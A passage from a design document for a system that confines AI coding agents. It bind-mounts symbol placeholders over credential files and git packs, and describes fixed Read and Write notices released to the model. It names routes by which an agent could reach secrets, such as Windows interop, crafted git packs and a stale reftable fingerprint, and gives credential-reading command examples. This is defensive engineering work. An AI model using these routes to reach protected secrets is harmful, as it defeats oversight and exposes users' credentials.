confidentiality derivation before the path label is read), and the model
reads the notice for what it is. The release is as narrow as the integrity
rule's exact-match bar (`docs/design/integrity/read-result-rendering.md`
§6), and narrower:

- tool exactly `Read` under the claude-code spec (an explicit tool rule
  still wins), the whole result only, never a field;
- the value, surrounding whitespace aside, is EXACTLY one of the two
  "file unchanged" sentences (no free byte), or the seeded form ("This file
  is already in your context (see "Contents of <path>" above) …") whose
  one free span equals the call's own `file_path`, which the model wrote;
- nothing else: not the notice with any text before or after it (a
  trailing reminder block included), not a lookalike (a hyphen for the em
  dash, a value tacked on), not the empty-file or shorter-than-offset
  warnings (they say how long the file is), not the same sentence from
  another tool (`cat` of the file in Bash stays masked by the command's
  path). Codex reads files through its shell, which has no such notice,
  and OpenClaw's and OpenCode's `read` keep the mask (no notice of theirs
  is pinned).

A file cannot forge the shape: a Read renders file content behind a
line-number gutter, so no file's Read result equals the sentence; and were
a secret file's whole content that sentence, the release would show the
model only that fixed sentence. The value backstop in the arbiter's
classify op still runs on the verdict (raise-only), and the proxy's
process-taint and agent-receipt raises are untouched. Pinned by arbiter
`test/unit/read-dedup-notice.test.ts` (the predicate and the verdict, the
near-notices masked) and `tests/stack/read-dedup-notice.test.ts` (the real
arbiter, the real anthropic-proxy and the reply filter's adapter: a
labelled file's first Read is a symbol the reply filter resolves to the
file, each exact notice reaches the model as itself, every near-notice and
the Bash result stay masked, no file byte in the request and no symbol in a
Read result that resolves to the bare notice); the after-the-fact and
early-read stack tests now see the tour's second Read as the notice.

**The write notice (2026-10-11).** A write tool's result was classified by
the path its call names like any other, so the agent's answer to a Write of
a labelled path ("File created successfully at: <path>") reached the model
as a symbol. A session whose writes are derived-labelled (§4) got its own
Write's result back as `$MDU:anymodel_Write[…]` and could not tell whether
the write had worked. The result is now `public` when the whole value is
exactly the agent's fixed success notice for this call, whose only free
spans are the call's own path and (Goose, OpenClaw) a count of its content
(`isOwnWriteNotice`, `arbiter/policy/own-write-notice.ts`, applied beside
the Read dedup notice): Claude Code's `Write` (created or updated, its fixed
suffixes, then only its token-budget reminder), OpenCode 2's and Goose's
`write`, and OpenCode 1's ("Wrote file successfully.", 1.18.13) and
OpenClaw's ("Successfully wrote N bytes to <path>", 2026.7.1-2 and 2026.9.9)
`write`, each read in the agent's installed source at the CI pins. The
call must carry `content` (a whole-content write the model
authored), and the tool must resolve to that agent's built-in write entry
(an explicit tool rule still wins). The released text is a function of the
model's own input and a choice among a few fixed sentences: no byte of the
file, nothing the model did not write. Anything else keeps the path's mask:
the notice with other text before or after it (an older Claude Code's
snippet of the file after an update, OpenCode's diagnostics, another
reminder block), another path, an `Edit`'s notice, OpenClaw's "No changes
made" answer (a choice made on the file's bytes). A masked write result
does not register its notice line as a secret piece (a `write-notice`
result head, plan 10 §11.14), so it cannot mask the agent's later notices
through the value backstop; its other lines stay registered. Detail, the
bits the choice carries, and the tests: [plan 15 §13.10](./confidentiality-plan-15-prompt-filter.md), "A
Write's own result".

The same holds for npm, a default reader of `~/.npmrc`: when every token in
the file is one npm sends as written to the registry its key names, npm
reads the twin and the egress gate puts the token back at that registry
only, so npm and the MCP servers started with `npx` hold no secret and
taint nothing (plan 10 §11.13.1). Likewise for a password sent inside HTTP
Basic: npm's `username` + `_password` and a pip index password in
`pip.conf` or `PIP_INDEX_URL` reach the program as an encoded placeholder,
and the egress gate decodes the Basic pair and puts the password back at
the bound host only.

### 7.2 The valve WITHOUT the kernel tier — secret-path twins in the agent's userns

> **Status: BUILT, and the unprivileged substitute for the deferred kernel
> valve (§7.1).** Proven live on Linux against a real arbiter and a real
> bwrap sandbox (`launcher/test/secret-twins-live.test.sh`); macOS (§7.3) is
> implemented in a whole-agent Seatbelt profile. The macOS branch records
> hardware probes on 2026-09-29; this integration still needs a fresh Mac run. §10.1 states what the kernel deferral
> still costs.
>
> **Plan 10** narrows the whole-file twin below to the *baseline*: a
> **structured** twin (keys raw, each value its own symbol) for every
> program that is not a listed raw reader, and a per-file reader list whose
> members get the real bytes and carry the file's label as a process taint
> through stdout, `connect()`, written files and children, enforced by a
> seccomp user-notification interposer (the guard) as well as the bind
> ([`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
> §2.4, §4).
>
> The whole-file twin ends as the original does (the symbol followed by the
> file's own final line terminator, none, `\n` or `\r\n`, never its
> length). Three configuration shapes (`~/.ssh/config`, `pip.conf`, git's
> credential store) are exhaustive, so one with no secret value twins as
> its own text, and that own-text twin fails closed (plan 10 §11.13,
> §11.13.2): a place stays raw only where the format makes it public and
> its content has a public shape; an unknown keyword or key, a command no
> relay grammar vouches for, every `SetEnv` value, a comment, and a URL path
> or query word shaped like a credential are symbols. A withheld ssh
> command (plan 10 §11.13.3) is Mandu's refusal in the twin: ssh prints
> which line of which file was withheld, why and the way out, never the
> command's text; `whyPath` (`mandu why`, the dashboard) lists the withheld
> lines.

§7.1 masks secret paths out of *net-enabled* worlds, which needs the
exec-supervisor's per-exec interception. But the confidentiality goal does
not require per-exec granularity: it requires that **raw secret bytes never
exist inside any world the agent can reach.** That is achievable
unprivileged, and it is *stronger* than the kernel valve for this lattice:

> **The secret-path twin.** Inside the agent's mount namespace (an
> unprivileged userns, the secret-twins bwrap wrap), bind-mount over each
> catalog secret path a file whose CONTENT IS ITS SYMBOL: the AgentView
> "symbolized twin" idea (mandu.md §4, fs-sync) applied to secret paths.
> `cat ~/.aws/credentials` then yields `$MDU:nomodel_Read[3fa9]`, not the
> key. The agent, every subprocess it spawns, and any code an injection
> smuggles in all inherit that namespace, so **the raw bytes are absent
> from the agent's world entirely**. The arbiter (outside the namespace)
> still holds the original and injects it at the network chokepoint after
> the binding check, exactly as §7.1 intends. Where no bind can mount, the
> guard serves the twin by descriptor at `open()` (§10.1's posture table).

A twin needs no text matching on the origin string (§6), so a command that
reaches a secret by indirection cannot evade it: the bytes are not there.
It also cannot over-block: reads *succeed*, they just return a token.

Constraints:

- **The mask set is NOT `SENSITIVE_PATHS`.** That list includes the agent's
  own credentials (`~/.claude`, `~/.claude.json`, `~/.codex`,
  `~/.anthropic`), denied to the agent *as a tool user* by the fs-gate. But
  the agent RUNTIME reads them to start and authenticate, and it lives
  inside the same namespace; twinning them bricks the launch. The mount set
  is the credential-material subset **minus the agent's own auth/config**.
- **Requires an unprivileged userns or the guard.** Where neither is
  available the launch runs in the **`gated`** posture: §10.1's narrower
  claim and nothing more, said loudly on every launch (the notice, `mandu
  doctor`, the `launch_posture` event, the dashboard chip). The arbiter
  still pre-registers the catalog secrets, so their labels stay
  authoritative for model-context masking. On Ubuntu >= 23.10 the userns is
  one optional command away (`mandu setup`, the per-binary AppArmor grant).
  `--require-confinement` (env `MANDU_REQUIRE_CONFINEMENT`, config
  `require-confinement = true`) refuses instead, and is the recommended
  setting for managed deployments.
- **WSL2.** *Windows interop bypasses the twin:* a Windows program started
  through interop reads the REAL file via `\\wsl.localhost\<distro>\…` (the
  9p server lives in init's mount namespace). On WSL the wrap therefore
  hides the interop socket (`--tmpfs /run/WSL`), masks `/init` and unsets
  `WSL_INTEROP` (`launcher/src/wsl.ts` `wslTwinWrapFlags`), and the connect
  guard refuses the socket for launches with no wrap (exec-routing.md
  §4.1). *Every Windows user profile is a second home:* the same stores live
  under `/mnt/<drive>/Users/<name>` plus Windows spellings (`_netrc`,
  `AppData/Roaming/gcloud`, …). The launcher finds the drvfs mounts in the
  mount table, lists each drive's real user profiles, and asks the arbiter
  to discover the catalog's paths under each with THAT profile as the home
  its `~/` rules anchor to (`launcher/src/wsl.ts` `windowsProfiles`,
  `WINDOWS_PROFILE_SECRET_PATHS`). **A probe, not a walk:** drvfs costs a
  round trip per stat, so only the catalog's listed paths are stat'ed; a
  `.env` elsewhere in a Windows profile stays raw. **Case folding:** a
  different-case spelling (`.AWS/CREDENTIALS`) resolves to a dentry the
  bind is not on; the guard matches the file by inode as well as by path
  (plan 10 §4.1), so the spelling still gets the twin, and without the
  guard a launch that found Windows credentials refuses unless
  `--best-effort`. The guard's own check cannot be raced: it performs every
  open, once, and judges the file it opened (plan 10 §4.1a;
  write-protection.md §2 for writes). **Residue:** Windows-side agent auth
  is excluded as under HOME; the fs-outbound sensitive-path gate stays
  anchored to the Linux HOME; and none of it has run on a real drvfs
  (os-test-matrix.md `wsl2`).
- **Linux-only.** macOS Seatbelt cannot remount a path over its canonical
  location (§7.3).
- **A twinned secret is unreadable to real tools unless they are readers.**
  `ssh -i ~/.ssh/id_rsa` reads a token unless `ssh` is on that file's
  reader list (plan 10). That is the intended semantics of `no-model`
  (route, never read); the escape hatches are a reader entry, the approval
  queue, a per-path opt-out, or `--mode off` for the launch (the expert
  axis override `--no-confidentiality` does the same for this axis alone).
- **Symlinks: discover through none, bind on the real path.** The
  discovery walk (`arbiter/policy/secret-discovery.ts`) `lstat`s every
  entry and NEVER descends a symlinked directory: a link points out of the
  root by construction (`~/tools/linux → /mnt/…` once dragged a kernel
  tree's `Documentation/security/credentials.rst` into the registry). A
  symlinked *file* is still a candidate. The twin planner
  (`launcher/src/secret-twins.ts`) binds on the file's `realpath`: bwrap
  creates each mount point inside the new namespace and cannot `mkdir`
  through a symlinked parent, and since confinement is fail-closed one bad
  bind would refuse every launch. One bind per real file (two spellings
  dedupe), a file gone since discovery is skipped with a logged reason, and
  on macOS both spellings are denied. Guarded by unit tests in both
  packages and by the real-HOME launch smoke
  (`tests/sandbox/launcher/launcher-real-home.test.ts`).
- **Under the bind, a twin descriptor names the file, not the twin.** The
  twin is a file under the scope run dir (`<scope>/secret-twins/NNN-name`);
  the bind puts it at the real path, and the guard serves it by
  descriptor. Claude Code checks a Bash command's paths with Bun's
  `realpathSync` (an `O_PATH` open plus `readlink /proc/self/fd/N`), so a
  descriptor naming the twin's own path made the permission dialog offer
  "allow access to `<scope>/secret-twins`" (differential-interactive.md
  §20). The guard serves the twin through the agent's own path where that
  path already reaches the twin (plan 10 §4.1 step 4): the file is checked
  to be the twin by identity, and its descriptor names the path the agent
  named. Every descriptor of one file names one path, which Claude Code's
  Read tool requires. Without a bind (the guard-only posture) both name the
  twin and the dialog still does.
- **Discovery cost is launch latency.** `discoverSecretFiles` walks HOME on
  every launch (the `discoverSecrets` op). The per-entry matcher memoizes
  the normalized catalog prefixes and agent-auth excludes per home string
  (exact, so tests passing different homes stay independent), and the walk
  prunes toolchain and editor caches that carry no credential shapes
  (`.ccache`, `.npm`, `.nvm`, `.rustup`, `.vscode-server*`); `~/.cargo` is
  deliberately still walked (`~/.cargo/credentials.toml`). On a developer
  HOME of 140k entries this brought the walk from 5.9 s to 0.98 s, the I/O
  floor. The launcher starts the walk as soon as the AgentView is seeded
  and lets it run while the proxies and the network confine come up
  (`runtime-instances.md §14` §2 item 3), and the arbiter runs it on a worker thread
  over a snapshot of the label maps (§2 item 7 there), so other sessions do
  not stall; if the thread cannot run, the walk runs in-process. Guarded by
  `test/unit/secret-catalog.test.ts` (a 100k-path throughput bound, a
  two-home memo check) and `secret-discovery.test.ts`.
  **macOS (2026-09-29):** the HOME walk also prunes HOME's own
  `Library`, `.Trash`, `Pictures`, `Music` and `Movies` (`DARWIN_HOME_SKIP`,
  direct children of HOME only; a project's own `Library/` is walked):
  app data and media, parts of it TCC-protected (a walk there can raise
  macOS "access data from other apps" prompts on the terminal's behalf),
  and no credential shape the catalog knows outside the paths it names
  there, which are still visited, as under `SKIP_DIRS`. The prune never
  hides a labeled file: a label on the folder (or above it), or a pattern
  label that could match inside it, keeps the folder walked, and a literal
  label inside it is visited like a catalog path (`darwinPrune`, fed the
  label stores' keys as `DiscoveryOptions.labelPaths`). Measured on the
  development Mac (a light HOME): 18 ms → 16 ms, the same 11 files; on a
  synthetic used-Mac HOME with 24k entries in those folders: 1.0–1.7 s →
  1 ms, the same files (real-home-launch-robustness.md §2). Plan 14's other
  HOME walks prune the same folders through the same helper since
  2026-09-30 (confidentiality-plan-14-policy-suggestions.md §13.1, §11.1
  R1). The workspace scan's home tier needs no label re-entry (a covered
  file is never opened, so the prune loses no key finding; it does lose
  plan 14's sensitivity labels and model candidates under `~/Library`,
  plan 14 §11.3). The
  known-repository walk re-enters by `darwinPrune`: the registry's `label`
  source walks up from a label, so it reaches a labelled file's repository
  but not one below a labelled folder or a pattern's literal prefix, nor
  any for a pattern with no prefix.
- **Mandu's own state and install are not the walk's business**
  (`secret-discovery.md §1` §9 D, E). The view state base
  (`~/.mandu/state`) is pruned; the walk reaches the copies of THIS
  launch's workspace through the view map fs-sync persists (`workspace.json`
  → `agentview/`, walked as a root of its own), skips the symbolized ones
  by name (`agentview-symbolized`) and twins any raw one like its
  original; the `discoverSecrets` op carries the launch's `stateBase`. The
  installer's npm prefix (`~/.local/share/mandu/pkg`) and downloaded Node
  are pruned as `mandu-install`, only when verified on disk and matched by
  realpath; the prefix itself and any look-alike tree are still walked.

### 7.2a The committed bytes: git object-store twins (2026-09-28)

**The gap.** The twin replaces a protected file where the agent opens it. A
file committed to git also lives in `.git/objects`, and `git show`, `git
diff`, `git log -p`, or any program that inflates an object reads its bytes
without opening the file. The model boundary masks such output (the value
backstop, `model-endpoints.md` §1.8 item 1), but without this layer the raw bytes reached
the agent's own processes and Claude Code's local transcript.

**Why not rewrite the objects.** An object's name is the hash of its content,
so a blob cannot be replaced by its twin in place: git refuses a blob whose
content does not match its name, and deltas, `.idx`, bitmaps and the
multi-pack-index all point into the pack by position.

**The mechanism** (`launcher/src/git-object-twins.ts`, called by
`secret-setup.ts` after the file twins are planned, both postures):

1. For every confined file inside a git work tree, find each **protected
   version**: every blob the path had in any ref, the reflog and the stash
   (`git log --all --reflog -m --root --raw -- <path>`), each index stage
   (`ls-files -s`), and the working copy hashed as `git add` would store it
   (with no filter driver: its raw bytes and its end-of-line-converted
   bytes, never through a program the repository's config names;
   write-protection.md §8.4). Every git call here is hardened and, where
   a git sandbox works (bubblewrap on Linux, Seatbelt on macOS), sandboxed (write-protection.md §8.3, §8.5). A file with no
   such blob costs a few git calls and changes nothing.
2. For each pack holding a protected version, build a **sanitized pack**:
   the same objects minus the protected blobs, repacked by `git
   pack-objects` (never thin, so no delta leans on a missing base), with its
   own `.idx` and `.rev`. Which packs hold one is read from each `.idx` by
   its fanout table and a binary search per protected name (`idxLookup`),
   never by reading the whole index. Sanitized packs are cached under
   `~/.mandu/cache/object-twins/` (on-disk-layout.md §3), keyed by (pack
   name, excluded blobs); a cached index that still lists an excluded blob
   is never served. `git pack-objects` runs against a private, empty object
   directory beside the cache (`GIT_OBJECT_DIRECTORY`) and reads the
   repository's objects through `GIT_ALTERNATE_OBJECT_DIRECTORIES`, so the
   cache need not share a filesystem with the repository and nothing is
   written into the repository.
   **The index is rebuilt from the content.** `pack-objects` writes each
   object under the name the SOURCE index gives it and never hashes what it
   copies. The agent can write a repository's object store, so a crafted
   pack there (an index naming the protected blob's bytes as another object
   N, or a delta on the protected blob, which pack-objects resolves and
   writes out whole) would yield a sanitized pack carrying the protected
   bytes as N under an index listing no excluded name. So the index
   pack-objects wrote is discarded and `git index-pack` rebuilds it by
   hashing every object (with an empty object directory and no alternates,
   so it reads nothing else), and the rebuilt names must be exactly the
   objects asked for; anything else is a pack that cannot be sanitized
   (the launch refuses unless `--best-effort`). The same check runs in the
   arbiter's prepared copies (below).
3. The real `.pack`, `.idx` and `.rev` are **twinned** by the sanitized
   files, exactly as a credential file is: a `--bind` in the wrap, and an
   `object` entry in the guard's policy file, which the guard answers with
   the sanitized descriptor without asking the arbiter (no reader is ever
   handed a real pack). Where no bind is up, the guard also answers a stat
   of the real path with the sanitized file's metadata ("Guard-only
   metadata" below).
4. What indexes the real pack by position (its `.bitmap`, a cruft pack's
   `.mtimes`, the directory's `multi-pack-index` and its `.bitmap`/`.rev`)
   and every **loose** copy of a protected version are made
   **unreadable**: a bind of an empty mode-000 file (the wrap drops every
   capability, so EACCES), and a `deny` entry for the guard. Git treats an
   unreadable midx or bitmap as absent.

Git then sees a repository in which the protected versions are missing: `git
show HEAD:<file>` fails with "bad object", a `git log -p` or `git diff` stops
at the first patch that needs one ("unable to read"), and every other object,
`git status`, `git log -- <other path>` and new commits work. The twins
change nothing in the user's repository; git in the agent's world can still
commit a twin in place of its file ("A placeholder in your repository"
below).

**Cost on a relaunch.** On a large history the discovery itself is the
cost (a Linux kernel checkout, 1.4 M commits: a 29 s walk plus 5.7 s
reading three pack indexes whole). Three measures:

- **The walk is cached** per (repository, protected paths) in
  `~/.mandu/state/object-walks/<key>.json`, with the tips it started from
  (every ref and every reflog entry: what `git rev-list --all --reflog
  --no-walk` answers, read as the next item says) and a base key: the git
  version, the walk's arguments and rule, and the shallow boundary the walk
  honours (since 2026-10-21; grafts and replace refs are off, "What the
  walk does not let a repository hide" below). The same base and tips
  reuse the cached names; a tip gone away reuses them too (a superset only
  hides more); new tips walk only the commits the old tips cannot reach
  (`git log --stdin` with the old tips as `^` exclusions). Anything else,
  including a torn file or an incremental walk git refuses, walks the whole
  history (`git log --stdin` from the tips, the commits `git log --all
  --reflog` starts from). The kernel relaunch dropped from 35 s to 0.12 s.
- **The tips are read without `--reflog`** (2026-10-04,
  `launcher/src/reflog-tips.ts`). `git rev-list --all --reflog --no-walk`
  enumerates every reflog of the common directory once PER WORKTREE: in a
  repository with 163 worktrees and 1072 refs that was 177k `openat` and
  350k `read`/`fstat`, 1.3 s bare and ~2.5 s in a launch, while `rev-list
  --all --no-walk` takes 20 ms. Now the tips are each work tree's `rev-list
  --all --no-walk` (strict: a ref naming a missing object still fails) plus
  the old and new name of every entry of every reflog file of a
  files-backend repository (`<common>/logs/**` and
  `<common>/worktrees/*/logs/**`, exactly where git's `--reflog` reads),
  each file read once, then passed through `rev-list --no-walk
  --ignore-missing --stdin` so git keeps only the objects it has and peels
  each to its commit, as `--reflog` does. The answer is git's set or a
  superset of it (a log git skips: an invalid ref name, a worktree git no
  longer lists, a last line without a newline); it must never be smaller,
  since a missed tip could leave a protected version un-twinned. So every
  doubt asks git's own command instead: a ref storage other than files (the
  config's `extensions.refStorage`, or a `reftable` directory), a config git
  could not read, any entry that is not a plain directory or a regular file
  (a symlink, a FIFO), a line that is not `<name> <name> ` of the
  repository's hash length, more than 128 MiB, 200k files or depth 64. The
  files are opened `O_NOFOLLOW | O_NONBLOCK` and checked regular on the
  descriptor; what they hold reaches git only as object names on stdin. A
  unit test (`launcher/test/unit/reflog-tips.test.ts`) pins set equality
  with git's answer from every work tree of a fixture holding linked
  worktrees, a two-entry stash, reset-away and left-behind detached commits,
  a pruned entry and a tag in a reflog; the superset where git skips a
  deleted branch's surviving log; and each fallback. On this repository:
  2.9 s to 0.2 s, the same 1611 tips.
  **Paced (2026-10-21).** The read is the same synchronous calls in the
  same order, but hands the event loop back every 4 ms (`Pacer`): in a
  store with many worktrees and branches it held the main thread 30-40 ms
  in one go (runtime-instances.md §14.12). What it reads, its doubts and
  its caps are unchanged; a unit test reads 800 logs over 200 worktrees
  paced and in one go and gets the same names.
- **The arbiter's history readers read the reflogs the same way**
  (2026-10-04, `arbiter/policy/history-tips.ts` over
  `arbiter/src/reflog-tips.ts`, the launcher's reader, byte-identical:
  the packages ship standalone, and
  `tests/stack/reflog-tips-parity.test.ts` holds the copies equal). The
  background lock resolution (confidentiality-plan-14 §11.1 R2) and the
  git-history secret scan (secret-discovery.md §3) ran `--all --reflog` on
  every cycle and every scan: off the launch path, but competing with a
  launch for the CPU and the ref store. Now the resolver's tips are the
  launcher's for one work tree (`rev-list --all --no-walk` plus the
  reflogs' names through `rev-list --no-walk --ignore-missing --stdin`), so
  its resolution key is the one the launcher computes, and its full walk is
  `git log --stdin` from those tips. The scan's cache key takes the same
  tips; its listing (`rev-list --objects`) and its trace walks (`git log`)
  start from `--all --ignore-missing --stdin` with the reflogs' names on
  stdin, the same objects `--all --reflog` names (a name git no longer has
  is skipped, as `--reflog` skips a pruned entry; a ref naming a missing
  object no longer fails the whole listing). The rule is the launcher's:
  never fewer commits than `--all --reflog`, and on every doubt (another
  ref storage, a config or a `rev-parse` git could not answer, a symlink, a
  FIFO, a line that is not an entry, the caps) the old `--all --reflog`
  form runs. Commits of one second tie in git's date order and a tie goes
  by where a start was given, so a trace's first or last commit may name
  the other of two same-second commits than before; what is found and
  locked does not change. `arbiter/test/unit/history-tips.test.ts` pins,
  over secrets only a reflog names (a reset-away commit, a linked
  worktree's left-behind detached commit, an older stash entry), tips and
  listed objects equal to git's, each secret found and each version
  locked with no `--reflog` call, and each fallback with the same answer;
  the stack test runs the scan and the locks through a real arbiter, with
  and without a doubt, and the launcher's object twins take the arbiter's
  key. On this repository (the hardened git, its sandbox): the tips 3.0 s
  to 0.12 s and the scan's listing 3.2 s to 0.31 s, the same 1694 tips
  and 55 975 objects.
- **One object store, one read.** Work trees that share an object store (a
  worktree and its main checkout, both reached when the workspace is a
  worktree and HOME holds the main checkout) are read as one store: the
  tips (every work tree's `rev-list --all`, the reflogs once), the base,
  each walk by path and the pack plan once. The plan's exclusions are the
  UNION of every work tree's protected versions. Before, each work tree was
  planned alone, so a pack the two share got two sanitized twins with
  different exclusions, and the wrap (which binds one twin per path) served
  one of them: a version protected only in the other work tree stayed
  readable (found and fixed 2026-10-04; `launcher/test/kernel/
  git-object-twins.test.ts` reads it through the real wrap from both work
  trees). Each work tree's own index, working copies, HEAD and per-worktree
  refs are still read in it; a label walk stays per work tree (which paths
  it keeps depends on where the work tree is). It also halves the rebuilds
  while no seal is honoured (an unconfined launch live, below): each pack
  of the store is sanitized once per launch, not once per work tree.
- **Stores shared through alternates** (2026-10-04). Two SEPARATE
  repositories can share a pack too: one reads another's objects through
  `objects/info/alternates` (`git clone --shared`, `--reference`), or both
  borrow a third's. Planned per store, the shared pack got one twin per
  repository with different exclusions and the wrap bound the first, so a
  version protected in one repository (or stored only in the pack it
  borrows) stayed readable from both; and an alternate's own alternates
  were not followed, so a version in a pack two links away was not twinned
  at all. Both were reproduced through the real wrap before the fix. Now
  each store's object directories are its own plus every alternate it
  reaches (`objectStoreClosure`: breadth first, an alternate's alternates
  included, each once by its real path so a cycle ends; a relative entry
  resolves against the directory whose file names it, as in git; an entry
  naming nothing is skipped, as git skips it). The file is parsed as git
  parses it (`parseAlternates`: `#` comments, C-quoted entries, nothing
  trimmed; an entry with surrounding blanks also adds its trimmed
  spelling, a superset that can only hide more). The plan is then made
  PER REAL OBJECT DIRECTORY (`clusterObjectStores`): each directory once,
  its exclusions the union of the protected versions of every store in the
  launch that reaches it; stores linked through a shared directory form one
  cluster, twinned (or, under `--best-effort`, failed and named) as one.
  Fail-closed, never a shorter list: an `info/alternates` that is not a
  regular file (a directory, a FIFO, opened `O_NONBLOCK` so it never blocks
  the launch), cannot be read, is over 1 MiB, is not UTF-8, holds a NUL or
  a quoted entry git would not unquote; an entry whose resolution fails
  other than "nothing there"; a chain deeper than 16 links (git itself
  stops at six) or more than 256 directories; or a directory read by
  repositories of two object formats refuses that store (the launch,
  unless `--best-effort`). The closure is ONE implementation shared by
  both readers of it: `git-alternates.ts`, a byte-identical file in
  `launcher/src` and `arbiter/src` (the packages ship standalone;
  `tests/stack/prepared-copies-parity.test.ts` holds the copies equal), so
  the arbiter's copies prepared ahead of time (below, "Copies prepared ahead
  of time") reach every directory the launcher's twins do. Both sides of the
  prepared copies read it: the arbiter's background preparation
  (`prepared-copies.ts` `inventoryStores`: each real object directory once,
  a pack several known repositories reach one copy, built once, its bytes
  counted once; a repository whose alternates cannot be read as git reads
  them, or whose directory is read by two object formats, is `failed` and
  gets no copy, its packs left to the guard's backstop) and the launch
  (`preparedCopyTwins`, which serves a pack two listed repositories reach
  once). Their exclusions come from the one global locked set, so a shared
  pack gets one key whoever reaches it: the union of every locked version
  it holds. Tests: `launcher/test/unit/git-object-twins.test.ts` (the
  parser, the closure with its bounds, the production reader on a
  directory, a FIFO, an oversized and a non-UTF-8 file, the clustering),
  `launcher/test/kernel/git-object-twins.test.ts` (a `clone --shared` pair
  in both launch orders and a three-link chain, read through the real wrap
  from each repository; an unreadable alternates file refused),
  `arbiter/test/unit/prepared-copies.test.ts` (an A ← B ← C chain with C
  registered alone, a `clone --shared` pair whose shared pack holds
  versions each locks, a cycle, a relative entry, a FIFO, a directory, a
  bad quoted entry, a NUL, a non-UTF-8 file two links away, an unreadable
  file), `tests/stack/prepared-copies-parity.test.ts` (the chain through the
  production adapter, bound by the launcher for C) and the kernel e2e K14
  in `tests/sandbox/git-history-locks.test.ts` (git in C under the wrap).
  **K14 run red on the old code (2026-10-17).** The arbiter's `locate`
  put back to the inventory before the closure (its own object directory
  and the alternates file's lines, one level), in a scratch commit, K14
  alone in the CI guest (`vm-run.sh --commit <scratch> --exec`, Ubuntu
  24.04, Linux 6.8): it fails at A's copy (no directory under the union
  key: A's pack got no copy). Run again with that check taken out, the
  launch half fails too: `git -C C log` exits 128 (`bad object HEAD`),
  `show HEAD:README` fails, and the launch prints that git was refused in
  A, B and C for the session (the guard's backstop on the unprepared
  pack); no locked key reached the agent's world either way. On the
  current code it passes. The test is not vacuous; the copy check now
  reports a missing directory as a missing copy rather than an `ENOENT`.
- **The small calls are batched and concurrent.** One `rev-parse` per work
  tree (object format, common dir, the shallow, grafts and
  `info/attributes` paths; an older git that refuses
  `--show-object-format` gets the old split), one `config --get-regexp` per
  work tree (end of line, `core.attributesFile`, `extensions.refStorage`;
  `--path` asked again only for a value git would expand), and `git
  version` taken from the git sandbox's own `git --version` probe. The
  rev-lists, `for-each-ref`, `ls-files`, both `hash-object`s and the walk
  run at once. A relaunch of this repository's twins (two work trees, warm
  caches): 24 git calls and 5.3 s before, 14 and 0.3 s after; in a real
  `mandu claude --version` from one of its worktrees the git history step
  went from 3.5-4.3 s to 0.35 s.
- **The pack indexes are searched, not read** (`idxLookup`): the header,
  the fanout table and the ~24 entries a binary search visits per
  protected name. The full object list is read only to rebuild a pack.
- **Repositories are read concurrently** (8 at a time), then packs are
  rebuilt and twins assembled one object store at a time in order, so the
  rebuild cap counts exactly as before; `git version` is asked at most once
  per launch (`runtime-instances.md §14`).
- **The seal check's hashes run beside the git calls** (2026-10-04,
  `launcher/src/file-hashes.ts`, plan 14 §11.2 "Cost"): on worker threads,
  every cached pack of a cluster at once, the workers brought up while the
  repositories are read. The full hash, and every check still gates its
  pack.
- **The prefetch** (2026-10-04, `launcher/src/twin-prefetch.ts`,
  `launcher/src/launch-hint.ts`). Each launch leaves a hint in
  `state/object-walks/launch-hints/<sha256 of the workspace>.json`: the work
  trees whose history state it read, one list per object store, and the
  cache keys of the packs it served. The next launch from that workspace
  starts those reads when it starts, while the services come up and the
  arbiter's discovery walks: the packs' hashes, and per store the work
  trees' facts, the config, then the tips and the base. The hint is only a
  hint (bounded, exact shape, read `O_NOFOLLOW`; anything else is no
  prefetch). A prefetched STATE is used only (1) for exactly the work trees
  the launch reads as that store (one more or one fewer computes it anew),
  (2) when the facts and the config the launch reads fresh equal the ones
  it was computed from, and (3) when a FINGERPRINT of every input of the
  tips is unchanged: each work tree's `.git` (its content when a file);
  HEAD, `packed-refs`, `config`, `config.worktree`, the shallow file (no
  grafts file since 2026-10-21: every hardened call reads an empty one);
  every directory and file under `refs/`, `logs/` and `reftable/`;
  each linked worktree's HEAD, `commondir`, `gitdir`, `config.worktree`,
  `refs/`, `logs/` and `reftable/`;
  every object directory the store reads (alternates followed), its `pack/`,
  `info/`, `info/alternates` and each loose fan-out directory (whether a
  reflog's object exists is part of the tips). Each entry is (type, device,
  inode, size, mtime, ctime in ns), taken BEFORE the prefetch's git calls and
  again at use. git changes a ref by renaming a new file into place and a
  reflog by appending, so a commit made between the prefetch and the use
  changes the fingerprint and the state is discarded; a fingerprint taken
  while any entry is younger than two seconds is not used at all (git's
  "racily clean"), so a later change can never carry the timestamp of the
  value it replaced. A symlink in those trees, an unreadable entry or more
  than 200,000 entries: no prefetch. A prefetched hash is used only for the
  same unchanged file (above). Anything else is discarded and computed as
  before; a prefetch failure never fails or weakens a launch. The launcher
  closes the prefetch on every path (and on exit): every git call still
  running is killed (each a process group of its own), the workers end; it
  writes nothing but the hint. Residual: a same-size rewrite in place,
  within one timestamp granule, on a filesystem whose clock runs more than
  two seconds behind the host's (git never writes a ref or a log so).
  **Security fix (2026-10-21): a linked worktree's own `reftable/`.** A
  reftable repository (`extensions.refStorage = reftable`) keeps each
  linked worktree's HEAD, its own refs (`refs/bisect`, `refs/worktree`,
  `refs/rewritten`) and their reflogs in `worktrees/<id>/reftable/`, its
  HEAD file a stub. The fingerprint walked `reftable/` at the common level
  only, so a worktree's HEAD moved between the prefetch and its use (`git
  update-ref --no-deref HEAD`, or any move that writes no index) left it
  unchanged: the stale tips were used, the walk cache answered for them,
  and a protected version reachable only from that HEAD stayed out of the
  twins, readable through `git show <commit>:<file>`. Now each linked
  worktree's `reftable/` is walked as its `refs/` and `logs/` are. Audited
  with it, against what the tips are read from (each work tree's `rev-list
  --all --no-walk`, the reflogs, `for-each-ref refs/replace/`, the base):
  HEAD and the refs of both levels in either backend (files: `HEAD`,
  `refs/**`, `packed-refs`; reftable: `reftable/**` of the common dir and
  now of each worktree), the stash (`refs/stash` and its log), the reflogs
  of both levels, which worktrees count (`worktrees/<id>/gitdir`,
  `commondir`), the object directories with their alternates (whether an
  object exists decides a reflog tip and a peel), `shallow`,
  `info/grafts`, replace refs (refs), and the config (its files by stat,
  its effective `extensions.refStorage` read fresh and compared).
  Pseudo-refs (`ORIG_HEAD`, `FETCH_HEAD`, `MERGE_HEAD`) and the index are
  not tips (`--all` names `refs/` and the HEADs). Residual: a setting from
  an included or the user's global config file is not fingerprinted; of
  those only `core.useReplaceRefs` can change a tip (a peel through a
  replaced tag), and only between the prefetch and its use. Tests:
  `launcher/test/unit/twin-prefetch.test.ts` (the worktree's HEAD, a
